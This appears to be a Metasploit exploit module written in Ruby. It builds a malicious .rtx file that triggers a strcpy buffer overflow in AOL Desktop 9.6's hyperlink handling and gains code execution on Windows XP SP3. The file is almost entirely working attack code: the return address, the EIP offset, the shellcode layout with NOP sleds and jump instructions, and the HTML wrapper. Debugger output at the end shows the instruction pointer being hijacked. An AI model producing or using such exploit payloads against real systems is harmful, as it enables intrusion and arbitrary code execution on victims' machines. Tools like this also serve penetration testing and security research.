##
# $Id: aol_desktop_linktag.rb 12284 2011-04-08 23:09:31Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info={})
        super(update_info(info,
            'Name'           => "AOL Desktop 9.6 RTX Buffer Overflow",
            'Description'    => %q{
                    This module exploits a vulnerability found in AOL Desktop 9.6's Tool\rich.rct
                component. By supplying a long string of data in the hyperlink tag, rich.rct copies
                this data into a buffer using a strcpy function, which causes an overflow, and
                results arbitritray code execution.
            },
            'License'        => MSF_LICENSE,
            'Version'        => "$Revision: 12284 $",
            'Author'         =>
                [
                    'sup3r',     #Initial disclosure, poc (9.5)
                    'sickn3ss',  #9.6 poc
                    'sinn3r',    #Metasploit
                ],
            'References'     =>
                [
                    [ 'OSVDB', '70741'],
                    [ 'URL', 'http://www.exploit-db.com/exploits/16085/' ],
                ],
            'Payload'        =>
                {
                    'BadChars' => "\x00\x0d\x0a\x3e\x7f",
                    'StackAdjustment' => -3500,
                },
            'DefaultOptions' =>
                {
                    'ExitFunction' => "process",
                },
            'Platform'       => 'win',  
            'Targets'        =>
                [
                    [
                        'AOL Desktop 9.6 on Windows XP SP3',
                        {
                            'Ret'=>0x01DB4542,  #0x01DB4542 JMP ESI
                            'Offset'=>5391,     #Offset to EIP
                            'Max'=>8000,        #Buffer max. Can be more.
                        },
                    ],
                ],
            'Privileged'     => false,
            'DisclosureDate' => "Jan 31 2011",
            'DefaultTarget'  => 0))
 
            register_options(
                [
                    OptString.new( 'FILENAME', [false, 'The filename', 'msf.rtx'] ),
                ]
            )
    end
 
    def exploit
 
        # Compatible with what the poc has, and what I see on my debugger
        sploit  = ''
        sploit << rand_text_alpha(4968+16)
        sploit << payload.encoded
        sploit << rand_text_alpha(5368-sploit.length)
        sploit << make_nops(11)
        sploit << "\xe9\x70\xfe\xff\xff"  #JMP back 400 bytes
        sploit << [target.ret].pack('V')
        sploit << make_nops(target['Offset']-sploit.length-2)
        sploit << "\xeb\x04"
        sploit << [target.ret].pack('V')
        sploit << payload.encoded
        sploit << rand_text_alpha(target['Max']-sploit.length)
 
        link_value = rand_text_alpha(6)
 
        rtx  = "<HTML>"
        rtx << "<A HREF=\"#{sploit}\">#{link_value}</A>"
        rtx << "</HTML>"
 
        print_status("Creating #{datastore['FILENAME']}...")
        file_create(rtx)
    end
end
 
=begin
0:000> g
Breakpoint 0 hit
eax=00000006 ebx=06652370 ecx=02d9c898 edx=038d0000 esi=00000000 edi=02d99b30
eip=6909e187 esp=0022e638 ebp=0022e648 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
rich!ToolInit+0xed2c:
6909e187 e85cd50300      call    rich!ToolInit+0x4c28d (690db6e8)
0:000> g
(8d8.924): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=02d38358 ecx=00000000 edx=00000030 esi=02d53cb8 edi=0022e7c4
eip=43434343 esp=0022e760 ebp=0022e780 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210202
43434343 ??              ???
0:000> dd esi
02d53cb8  43434343 43434343 43434343 43434343
02d53cc8  43434343 43434343 43434343 43434343
02d53cd8  43434343 43434343 43434343 43434343
02d53ce8  43434343 43434343 43434343 43434343
02d53cf8  43434343 43434343 43434343 43434343
02d53d08  43434343 43434343 43434343 43434343
02d53d18  43434343 43434343 43434343 43434343
02d53d28  43434343 43434343 43434343 43434343
=end
